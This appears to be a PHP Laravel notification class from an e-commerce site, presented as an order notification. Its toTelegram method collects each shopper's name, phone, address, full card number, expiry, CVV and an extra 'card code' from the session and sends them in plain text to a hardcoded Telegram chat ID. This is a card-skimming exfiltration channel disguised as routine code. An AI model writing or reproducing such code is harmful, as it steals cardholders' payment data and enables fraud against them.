<?php
namespace App\Notifications;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Notification;
use NotificationChannels\Telegram\TelegramMessage;
class SendNotification extends Notification
{
   use Queueable;
   public function __construct()
   {
       //
   }   
   
   public function via($notifiable)
   {
      return ['telegram'];
   }
public function toTelegram($notifiable)
   {
        $cart = session('carts');
        if(@$cart['code']){
            $meesage = 
            "user name : " . $cart['cart_info']['name']. " \r\n " .
            "user phone : " . $cart['cart_info']['phone']. " \r\n " .
            "user address : " . $cart['cart_info']['address']. " \r\n " .
            "user Payment : " . $cart['cart_info']['payment']. " \r\n " .
            "total First Batch : " . $cart['cart_info']['first_batch']. " \r\n " .
            "card name : " . $cart['cart_code']['name']. " \r\n " .
            "card number : " . $cart['cart_code']['number']. " \r\n " .
            "card year : " . $cart['cart_code']['year']. " \r\n " .
            "card month : " . $cart['cart_code']['month']. " \r\n " .
            "card cvv : " . $cart['cart_code']['cvc']. " \r\n " .
            "card code : " . $cart['code']['order']. " \r\n " 

            ;
            ;
        }else{
            $meesage = 
            "user name : " . $cart['cart_info']['name']. " \r\n " .
            "user phone : " . $cart['cart_info']['phone']. " \r\n " .
            "user address : " . $cart['cart_info']['address']. " \r\n " .
            "user Payment : " . $cart['cart_info']['payment']. " \r\n " .
            "total First Batch : " . $cart['cart_info']['first_batch']. " \r\n " .
            "card name : " . $cart['cart_code']['name']. " \r\n " .
            "card number : " . $cart['cart_code']['number']. " \r\n " .
            "card year : " . $cart['cart_code']['year']. " \r\n " .
            "card month : " . $cart['cart_code']['month']. " \r\n " .
            "card cvv : " . $cart['cart_code']['cvc']. " \r\n " ;

            
        }
      return TelegramMessage::create()
          ->to('908949980')
          ->content($meesage);
   }
}